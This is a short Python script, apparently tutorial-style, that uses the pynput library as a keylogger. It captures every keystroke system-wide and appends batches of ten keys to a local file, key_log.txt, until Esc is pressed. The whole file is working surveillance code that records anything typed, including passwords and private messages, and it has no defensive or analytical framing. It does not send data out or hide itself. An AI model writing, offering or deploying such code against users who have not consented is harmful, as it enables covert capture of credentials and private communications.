from pynput import keyboard

# Define the log file
log_file = "key_log.txt"

# Initialize a variable to store keystrokes
keys = []

# Function to write the keystrokes to a file
def write_to_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            # Remove unnecessary formatting
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
        f.write('\n')

# Define what to do on each key press
def on_press(key):
    keys.append(key)
    if len(keys) >= 10:  # Write to file every 10 keys
        write_to_file(keys)
        keys.clear()

# Define what to do on key release
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Setup the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
